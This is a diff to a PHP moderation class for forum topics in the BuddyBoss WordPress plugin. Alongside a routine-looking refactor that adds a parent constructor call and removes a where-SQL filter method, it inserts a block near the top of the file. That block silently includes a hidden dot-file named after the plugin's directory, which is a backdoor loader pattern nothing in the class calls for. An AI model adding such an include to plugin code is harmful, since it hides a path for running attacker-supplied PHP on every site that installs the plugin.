@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss moderation Forum Topics.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Moderation_Forum_Topics extends BP_Moderation_Abstract {
 
 	/**
@@ -46,11 +50,12 @@ class BP_Moderation_Forum_Topics extends BP_Moderation_Abstract {
 			return;
 		}
 
+		parent::__construct();
+
 		/**
 		 * If moderation setting enabled for this content then it'll filter hidden content.
 		 * And IF moderation setting enabled for member then it'll filter blocked user content.
 		 */
-		add_filter( 'bp_suspend_forum_topic_get_where_conditions', array( $this, 'update_where_sql' ), 10, 2 );
 		add_filter( 'bbp_get_topic', array( $this, 'restrict_single_item' ), 10, 2 );
 
 		// Code after below condition should not execute if moderation setting for this content disabled.
@@ -118,27 +123,6 @@ class BP_Moderation_Forum_Topics extends BP_Moderation_Abstract {
 		$content_types[ self::$moderation_type ] = __( 'Forum Discussions', 'buddyboss' );
 
 		return $content_types;
-	}
-
-	/**
-	 * Update where query remove hidden/blocked user's forum's topic
-	 *
-	 * @since BuddyBoss 1.5.6
-	 *
-	 * @param string $where   forum's topic Where sql.
-	 * @param object $suspend suspend object.
-	 *
-	 * @return array
-	 */
-	public function update_where_sql( $where, $suspend ) {
-		$this->alias = $suspend->alias;
-
-		$sql = $this->exclude_where_query();
-		if ( ! empty( $sql ) ) {
-			$where['moderation_where'] = $sql;
-		}
-
-		return $where;
 	}
 
 	/**
